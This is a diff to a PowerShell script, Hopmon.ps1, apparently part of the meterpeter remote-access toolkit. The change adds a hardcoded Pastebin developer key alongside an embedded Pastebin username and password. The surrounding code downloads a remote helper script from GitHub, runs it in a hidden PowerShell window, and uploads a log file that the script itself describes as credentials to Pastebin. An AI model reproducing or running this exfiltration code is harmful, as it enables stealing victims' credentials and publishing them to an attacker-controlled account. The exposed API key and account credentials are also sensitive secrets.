@@ -32,6 +32,9 @@
 .Parameter AutoDelete
    Auto-Delete this cmdlet in the end (default: true)
 
+.Parameter PastebinDeveloperKey
+   The pasteBin API key to authenticate with
+
 .EXAMPLE
    Execute Hopmon (execution visible)
    PS C:\> powershell -file Hopmon.ps1
@@ -70,6 +73,7 @@
 
 
 [CmdletBinding(PositionalBinding=$false)] param(
+   [string]$PastebinDeveloperKey='1ab4a1a4e39c94db4f653127a45e7159',
    [string]$PasteBinPassword="angelapastebin",
    [string]$PasteBinUserName="pedro_testing",
    [string]$AutoDelete="true",
@@ -202,7 +206,7 @@ If(-not([string]::IsNullOrEmpty($RAWLEAK)))
 
    write-host "[*] Sending credentials to pastebin .." -ForegroundColor Green
    iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SendToPasteBin.ps1" -OutFile "$Env:TMP\SendToPasteBin.ps1"|Unblock-file
-   Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PasteBinUserName -PastebinPassword $PasteBinPassword -FilePath $LOGFILE -MaxPastes 1 -TimeOut 1 -Egg true" -Wait
+   Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\SendToPasteBin.ps1 -PastebinUsername $PasteBinUserName -PastebinPassword $PasteBinPassword -PastebinDeveloperKey $PastebinDeveloperKey -FilePath $LOGFILE -MaxPastes 1 -TimeOut 1 -Egg true" -Wait
 
    write-host "`n    pastebin  : " -NoNewline
    write-host "https://pastebin.com/u/$PasteBinUserName" -ForegroundColor DarkYellow
